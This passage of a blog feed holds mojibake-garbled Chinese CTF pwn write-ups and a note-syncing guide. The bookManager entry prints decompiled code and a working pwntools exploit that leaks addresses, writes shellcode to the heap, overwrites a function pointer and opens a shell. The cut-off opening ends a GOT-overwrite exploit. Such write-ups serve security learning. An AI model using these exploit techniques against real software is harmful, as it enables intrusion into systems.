class="line"></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line">change_password(<span class="number">2</span>,p64(elf.got[<span class="string">'atoi'</span>]<span class="number">-0x18</span>))</span><br><span class="line">change_password(<span class="number">2</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.send(<span class="string">'sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ç¬¬ä¸€æ¬¡åˆ†æpwnçš„é¢˜æµé‡ï¼ŒçœŸéš¾å—æ­»äº†ï¼Œåªæœ‰è¾“å…¥çš„æµé‡ï¼Œæ²¡æœ‰å›æ˜¾ã€‚æœç„¶pwnæ‰‹éƒ½æ¯”è¾ƒå•çº¯ï¼Œæ²¡æœ‰æ··æ·†æµé‡ï¼Œä¸åƒwebï¼Œä¸€å¤§å †wangyihangçš„fake requests[æ‚è„¸]ã€‚webé¢˜ä¼°è®¡æ²¡æ—¶é—´å¤ç°äº†ï¼Œæè¿™é¢˜storeç”¨äº†æˆ‘å¥½å‡ å¼ A4çº¸ï¼ŒçœŸæ˜¯ç´¯æ­»äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¸Šä¸ªæœˆåœ¨æŠ¤ç½‘æ¯æ‰“äº†ä¸ªé…±æ²¹ï¼Œç¬¬ä¸€æ¬¡æ‰“æŸå®çš„çº¿ä¸‹èµ›ï¼Œé£æ ¼è·ŸæŸæ˜¥ç§‹å·®åˆ«è¿˜æ˜¯æŒºå¤§çš„ï¼Œæ²¡ä»€ä¹ˆç«¯å£é™åˆ¶ï¼Œæflagæ¥å£ä¹Ÿå¾ˆå‹å¥½ï¼Œå±äºæœ€å¼€æ”¾çš„ç½‘ç»œç¯å¢ƒäº†ï¼Œ
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>æŠ¤ç½‘æ¯çº¿ä¸‹èµ›ç§¯åˆ†èµ›bookManager</title>
    <link href="https://4f-kira.github.io/2018/10/29/huwangbei-bookmanager/"/>
    <id>https://4f-kira.github.io/2018/10/29/huwangbei-bookmanager/</id>
    <published>2018-10-29T07:50:59.000Z</published>
    <updated>2018-10-29T08:08:35.500Z</updated>
    
    <content type="html"><![CDATA[<p>æŠ¤ç½‘æ¯çº¿ä¸‹èµ›ç¬¬ä¸€åœºæ˜¯ctfç§¯åˆ†èµ›ï¼Œç§’åšpwnç­¾åˆ°é¢˜ä¹‹åä¸€ç›´æ— æ‰€äº‹äº‹ï¼Œè¿™é“bookManagerå½“æ—¶ä¹Ÿæ²¡èƒ½åšå‡ºæ¥ï¼Œè¶ç€ä¸­åˆåˆä¼‘çš„æ—¶å€™ï¼ŒæŠŠè¿™æ¡é¢˜é‡æ–°åšåšã€‚</p><h2 id="bookManager"><a href="#bookManager" class="headerlink" title="bookManager"></a>bookManager</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/huwangbei/task_bookManager&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  init_(v3);  <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">  v6 = v3;</span><br><span class="line">  qword_202088 = v3 + <span class="number">12</span>;  <span class="comment">// å‡ºé¢˜äººæ•…æ„ç•™çš„æŒ‡é’ˆ</span></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)menu() != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(__int64))(*(_QWORD *)v6 + <span class="number">8L</span>L))(v6);<span class="comment">// func[2] == show</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        (*(<span class="keyword">void</span> (__fastcall **)(__int64))(*(_QWORD *)v6 + <span class="number">16L</span>L))(v6);<span class="comment">// func[1] == edit</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(<span class="keyword">void</span> (__fastcall ***)(__int64))v6)(v6);<span class="comment">// func[0] == add</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºæä¾›äº†ä¸‰ç§åŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯<code>add,edit,show</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">sub_B10</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_QWORD *)a1 = off_201DC0;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>((<span class="keyword">void</span> *)(a1 + <span class="number">12</span>), <span class="number">0</span>, <span class="number">0xF0</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºåˆå§‹åŒ–æ—¶ï¼Œæ–°å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­<code>off_201DC0</code>å­˜æ”¾äº†ä¸‰ä¸ªåŸºæœ¬åŠŸèƒ½çš„å‡½æ•°åœ°å€ï¼Œå¤§æ¦‚ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func[3]         8byte</span><br><span class="line">book_count      4byte</span><br><span class="line">book1conent     8byte</span><br><span class="line">book1index      4byte</span><br><span class="line">book2conent     8byte</span><br><span class="line">book2index      4byte</span><br><span class="line">        ....</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹ä¸€ï¼š<code>show</code>çš„å‡½æ•°å¯ä»¥è¾“å…¥è´Ÿæ•°ï¼Œå¦‚æœè¾“å…¥<code>-1</code>å°±å¯ä»¥æŠŠ<code>func[3]</code>çš„åœ°å€æ³„éœ²å‡ºæ¥ï¼Œä»è€Œè®¡ç®—å‡ºELFåŸºå€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">show</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which book do you want to show?"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"book name is:%s\n"</span>, a1 + <span class="number">12L</span>L * v2 + <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹äºŒï¼š<code>eidt</code>çš„å‡½æ•°åŒæ ·å¯ä»¥è¾“å…¥è´Ÿæ•°ï¼Œå¦‚æœè¾“å…¥<code>-1</code>å°±å¯ä»¥ä¿®æ”¹å¯¹è±¡å­˜æ”¾çš„å‡½æ•°åœ°å€ï¼Œè€ƒè™‘åˆ°ç¨‹åºæ²¡å¼€<code>NX</code>ï¼Œæœ¬é¢˜å¯ä»¥ä½¿ç”¨shellcodeæ¥getshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"change Book id:"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"new Name:"</span>);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">12L</span>L * v2 + <span class="number">12</span>) = buf;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯æ§çš„è¾“å…¥å­—æ®µæ˜¯bookçš„contentï¼Œé—®é¢˜æ˜¯å¦‚ä½•æ³„éœ²heapåœ°å€ï¼Œæ¯”èµ›çš„æ—¶å€™ä¸€ç›´æ²¡æƒ³åˆ°æ–¹æ³•ã€‚ç›´åˆ°å‰©æœ€ååŠå°æ—¶ï¼Œæ‰å‘ç°å‡ºé¢˜äººåœ¨ç¨‹åºé‡Œæ•…æ„ç•™äº†ä¸€ä¸ªå¯ç”¨çš„æŒ‡é’ˆ<code>qword_202088</code>ï¼Œæœç„¶è¿™äº›èœœæ±å˜é‡éƒ½æ˜¯æœ‰ç”¨çš„ï¼</p><p>è¿™ä¸ªåœ°å€å°±æ˜¯ç›´æ¥æŒ‡å‘<code>book1conent</code>å¼€å§‹çš„åœ°æ–¹ï¼Œå¦‚æœæŠŠå¯¹è±¡å­˜æ”¾çš„å‡½æ•°åœ°å€ä¿®æ”¹ä¸ºè¿™ä¸ªåœ°å€ï¼Œé‚£ä¹ˆè¾“å…¥<code>1</code>ä¹‹åï¼ˆfunc[0]ï¼‰ï¼Œå°±èƒ½è¿è¡Œheapä¸­çš„shellcodeï¼Œæ³¨æ„æ¯ç»„<code>content</code>åªæœ‰8å­—èŠ‚é•¿åº¦ï¼Œä¸­é—´æœ‰4å­—èŠ‚æ˜¯å­˜æ”¾<code>index</code>ã€‚</p><p>ç”±äºåˆ†æ®µå¤ªå¤šï¼Œé™¤å»è·³è½¬çš„<code>jmp short 4</code>ï¼Œåªå‰©6å­—èŠ‚ä¸€ç»„ï¼Œé‚£å°±å…ˆç”¨<code>read(0,&amp;buf,0xff)</code>æ¥æ‰©å¤§è¾“å…¥ï¼Œç„¶åå†å†™å…¥getshellçš„shellcodeã€‚</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'BookName:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'id:'</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Name:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'show?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">show(<span class="number">-1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name is:'</span>)</span><br><span class="line">func_addr = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'func_addr:&#123;:#x&#125;'</span>.format(func_addr))</span><br><span class="line">elf_address = func_addr - <span class="number">0x201dc0</span></span><br><span class="line">success(<span class="string">'elf_address:&#123;:#x&#125;'</span>.format(elf_address))</span><br><span class="line">shellcode_addr = elf_address + <span class="number">0x202088</span></span><br><span class="line"><span class="comment"># read(0,&amp;buf,0xff)</span></span><br><span class="line">jmp_4 = <span class="string">'\xeb\x04'</span></span><br><span class="line">shellcode1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                mov rsi, rax</span></span><br><span class="line"><span class="string">                xor rdi, rdi</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode1.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                xor rax, rax</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode2.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode3 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                mov edx,0xff</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode3.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode4 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode4)</span><br><span class="line"><span class="comment"># overwrite *func[3]</span></span><br><span class="line">edit(<span class="number">-1</span>,p64(shellcode_addr))</span><br><span class="line">p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.send(<span class="string">'\x90'</span>*<span class="number">48</span>+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æ³¨æ„<code>rdx</code>çš„ä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶<code>read</code>æ²¡ååº”ã€‚æ€»ç»“ä¸€ä¸‹ï¼Œå¹³æ—¶æ‰‹å†™shellcodeå¤ªå°‘äº†ï¼Œæœ€ååŠå°æ—¶æ‰‹å¿™è„šä¹±ï¼Œæ²¡æŠŠexpå†™å‡ºæ¥ï¼ˆè™½ç„¶åšå‡ºæ¥ä¹Ÿæ²¡ä»€ä¹ˆåµç”¨ï¼‰ã€‚è¿˜æœ‰å‡ é¢˜éš¾é“æœ‰ç‚¹å¤§ï¼Œä¹‹åéšç¼˜åšå§ï¼Œæœ‰æ—¶é—´å…ˆæŠŠAWDçš„pwné‡æ–°åšä¸€ä¸‹~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æŠ¤ç½‘æ¯çº¿ä¸‹èµ›ç¬¬ä¸€åœºæ˜¯ctfç§¯åˆ†èµ›ï¼Œç§’åšpwnç­¾åˆ°é¢˜ä¹‹åä¸€ç›´æ— æ‰€äº‹äº‹ï¼Œè¿™é“bookManagerå½“æ—¶ä¹Ÿæ²¡èƒ½åšå‡ºæ¥ï¼Œè¶ç€ä¸­åˆåˆä¼‘çš„æ—¶å€™ï¼ŒæŠŠè¿™æ¡é¢˜é‡æ–°åšåšã€‚&lt;/p&gt;
&lt;h2 id=&quot;bookManager&quot;&gt;&lt;a href=&quot;#bookManager&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>vnote+ä¼é¹…äº‘æ‰“é€ ä½ çš„ä¸ªäººç¬”è®°</title>
    <link href="https://4f-kira.github.io/2018/10/20/vnote/"/>
    <id>https://4f-kira.github.io/2018/10/20/vnote/</id>
    <published>2018-10-20T14:25:26.000Z</published>
    <updated>2018-10-20T14:26:54.215Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰ä¸€ç›´ç”¨æœ‰é“äº‘åšç¬”è®°ï¼Œç„¶è€Œæœ‰é“äº‘çš„åŠŸèƒ½å®åœ¨å¤ªåƒåœ¾äº†ï¼Œå”¯ä¸€å€¼å¾—ç§°èµçš„å°±åªæœ‰å…è´¹ç©ºé—´å¤§å’ŒåŒæ­¥é€Ÿåº¦å¿«äº†ï¼Œä¸æ”¯æŒä»£ç é«˜äº®ï¼Œæœç´¢åŠŸèƒ½åƒåœ¾å¾—æ— æ³•å¿å—ï¼Œæ‰¾ç¬”è®°å…¨é å¤§è„‘æ¨¡ç³Šç´¢å¼•ã€‚æ˜¯æ—¶å€™æ·˜æ±°è¿™ç§åƒåœ¾è½¯ä»¶äº†ï¼ï¼ï¼</p><p>è‡ªä»å­¦ä¹ äº†ç”¨markdownåšç¬”è®°ä¹‹åï¼Œå°±ä¸€å‘ä¸å¯æ”¶æ‹¾äº†ï¼Œæœ‰é“äº‘ä¹Ÿæ”¹ç”¨äº†markdownæ¥åšç¬”è®°ï¼Œæœ‰é“äº‘çš„markdownåŠŸèƒ½å…¶å®ä¹Ÿæ˜¯èƒ½æ¥å—çš„ï¼Œç„¶è€Œæ ¹æœ¬æ²¡åŠæ³•æœç´¢å†…å®¹ã€‚å½“ç„¶ä¹Ÿæœ‰<code>Typora</code>è¿™äº›å†™markdownçš„ç¥å™¨ï¼Œç„¶è€Œåšç¬”è®°è¿˜è¦è€ƒè™‘å¤šå°ç”µè„‘æ•°æ®çš„åŒæ­¥é—®é¢˜ï¼Œ<code>Typora</code>ç”¨æ¥å†™markdownè¿˜å¯ä»¥ï¼Œåšç¬”è®°å°±æœ‰ç‚¹ä¸æ–¹ä¾¿ã€‚</p><h2 id="vnote"><a href="#vnote" class="headerlink" title="vnote"></a>vnote</h2><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/tamlok/vnote" target="_blank" rel="noopener">https://github.com/tamlok/vnote</a></p><p>è‘—ååˆ’æ°´ç½‘ç«™<code>V2EX</code>ç½‘å‹å¼€å‘çš„ä¸€æ¬¾ç¬”è®°å·¥å…·ï¼ŒåŠŸèƒ½éå¸¸å¼ºåŠ²ï¼Œèƒ½æ»¡è¶³å¼ºè¿«ç—‡æ‚£è€…ä½¿ç”¨markdownçš„ä¸€åˆ‡éœ€æ±‚ï¼ˆä¸æ˜¯æˆ‘ï¼‰ï¼Œä½œè€…è¯•è¿™ä¹ˆè¯´è¿™æ¬¾è½¯ä»¶çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNoteçš„è®¾è®¡ç†å¿µå°±æ˜¯ï¼š é‡‡ç”¨ç²¾å¿ƒè®¾è®¡çš„è¯­æ³•é«˜äº®ï¼Œä»¥åŠä¸€äº›è¾…åŠ©æ‰‹æ®µï¼Œåœ¨ä¸ç‰ºç‰²æ–‡æœ¬ç»†èŠ‚çš„å‰æä¸‹ï¼Œæœ€å¤§é™åº¦åœ°å‡å°Markdownç¼–è¾‘å’Œé˜…è¯»ä¹‹é—´çš„å‰²è£‚æ„Ÿã€‚</span><br></pre></td></tr></table></figure><p><strong>ç¨‹åºç•Œé¢</strong></p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf15exr2kj20zl0kh0uu.jpg" alt=""></p><p>åœ¨GitHubä¸‹è½½ç»¿è‰²ç‰ˆè§£å‹å³ç”¨ï¼Œååˆ†æ–¹ä¾¿ã€‚</p><h2 id="ä¼é¹…äº‘"><a href="#ä¼é¹…äº‘" class="headerlink" title="ä¼é¹…äº‘"></a>ä¼é¹…äº‘</h2><p>ä¸ºäº†è§£å†³ç¬”è®°åŒæ­¥å’Œå¤‡ä»½é—®é¢˜ï¼Œç›´æ¥ç”¨<code>git</code>è§£å†³å¥½äº†ï¼Œvnoteåšç¬”è®°å°±æ˜¯ä¸€å †çš„æ–‡ä»¶ï¼Œç›´æ¥åŒæ­¥åˆ°è¿œç¨‹ä»£ç ä»“åº“å°±OXXKäº†ã€‚ä¸ºä½•è¦ç”¨ä¼é¹…äº‘ï¼Œä¸»è¦è€ƒè™‘<code>Github</code>æ²¡æœ‰å…è´¹ç§å¯†ä»“ï¼ˆ<del>æ€»æœ‰ç¾ç¾çš„ç¬”è®°ä¸èƒ½å…¬å¼€å˜›</del>ï¼‰ï¼Œè€Œä¸”æœ‰æ—¶é€Ÿåº¦æ„Ÿäººã€‚è‡ªå·±æ­ä¸ª<code>gitlab</code>ï¼Œå®¹æ˜“ä¼šç‚¸ï¼Œè¿˜è¦è¿ç»´å¤ªéº»çƒ¦äº†ã€‚</p><p>å®˜ç½‘åœ°å€ï¼š<a href="https://dev.tencent.com/" target="_blank" rel="noopener">https://dev.tencent.com/</a></p><p>æ³¨å†Œåç§å¯†ä»“æ•°é‡ä¸å—é™åˆ¶ï¼Œä»“åº“å®¹é‡ä¹Ÿæ˜¯ä¸é™åˆ¶çš„ï¼Œå›½å†…åŒæ­¥é€Ÿåº¦ä¹Ÿå¾ˆå¿«ã€‚</p><h2 id="éƒ¨ç½²æ–¹å¼"><a href="#éƒ¨ç½²æ–¹å¼" class="headerlink" title="éƒ¨ç½²æ–¹å¼"></a>éƒ¨ç½²æ–¹å¼</h2><ul><li><p>å®‰è£…gitï¼Œä¸‹è½½vnoteï¼Œæ³¨å†Œä¼é¹…äº‘</p></li><li><p>åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®</p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf1ozr85dj20w60isaap.jpg" alt=""></p></li><li><p>cloneåˆ°æœ¬åœ°</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://git.dev.tencent.com/xxxx/vnote_test.git</span><br><span class="line"><span class="built_in">cd</span> vnote_test</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"# vnote_test"</span> &gt;&gt; README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m <span class="string">"first commit"</span></span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><ul><li><p>vnoteé€‰æ‹©è¿™ä¸ªæ–‡ä»¶å¤¹åšç›®å½•</p></li><li><p>ç„¶åå°±å¯ä»¥æ„‰å¿«çš„å†™markdownäº†</p></li><li><p>ç¼–å†™ä¸€ä¸ªç®€å•çš„batè„šæœ¬ï¼Œæ–¹ä¾¿åŒæ­¥åˆ°è¿œç¨‹ä»“åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"%date% %time%"</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p><strong>åŒæ­¥æ•ˆæœå›¾</strong></p></li></ul><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf1lor4i1j213h0k00uy.jpg" alt=""></p><h2 id="å°¾å£°"><a href="#å°¾å£°" class="headerlink" title="å°¾å£°"></a>å°¾å£°</h2><p>vnoteè¿˜è¦å¾ˆå¤šå¼ºå¤§çš„åŠŸèƒ½è¿˜ä¸ä¼šç”¨ï¼Œä¸€å¤§å †ç¬”è®°æœ‰æ’æ¬äº†[å“­]ã€‚æœ¬æ–‡çº¯å±å‡‘æ•°ï¼Œå¦‚æœ‰ä¸å¯¹çš„åœ°æ–¹ï¼Œè¯·æ— è§†~</p>]]></content>
    
    <summary type="html">
    
      
      
